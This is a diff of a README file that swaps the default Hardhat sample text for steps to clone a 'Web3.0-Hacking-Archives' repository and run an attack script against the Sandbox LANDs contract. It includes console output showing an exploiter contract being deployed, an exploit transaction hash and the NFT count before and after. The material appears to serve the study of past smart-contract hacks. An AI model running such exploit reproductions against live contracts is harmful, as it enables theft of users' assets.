@@ -1,15 +1,14 @@
-# Basic Sample Hardhat Project
-
-This project demonstrates a basic Hardhat use case. It comes with a sample contract, a test for that contract, a sample script that deploys that contract, and an example of a task implementation, which simply lists the available accounts.
-
-Try running some of the following tasks:
-
-```shell
-npx hardhat accounts
-npx hardhat compile
-npx hardhat clean
-npx hardhat test
-npx hardhat node
-node scripts/sample-script.js
-npx hardhat help
+```
+$  git clone --depth 1 https://github.com/xxxeyJ/Web3.0-Hacking-Archives
+$  cd ./Web3.0-Hacking-Archives-main
+$  cd Sandbox_LANDs
+$  ls
+README.md         contracts         hardhat.config.js package-lock.json package.json      scripts
+$  npm install
+$  vim hardhat.config.js // Fill in the RPC archive node KEY
+$  npx hardhat run scripts/attack.js
+[#] 👀 Exploiter Smart Contract deployed to: 0x7bc06c482DEAd17c0e297aFbC32f6e63d3846650
+[#] 🧛‍♀️ Amount of NFT held before the attack: 4012
+[+] 🥷 Exploiting Transcation Hash: 0x3d4184fd29c7d052c2e659708e45384aa9161d389066645b86f1536e235d92dd
+[#] 🧛‍♀️ Amount of NFT held after the attack: 4011
 ```
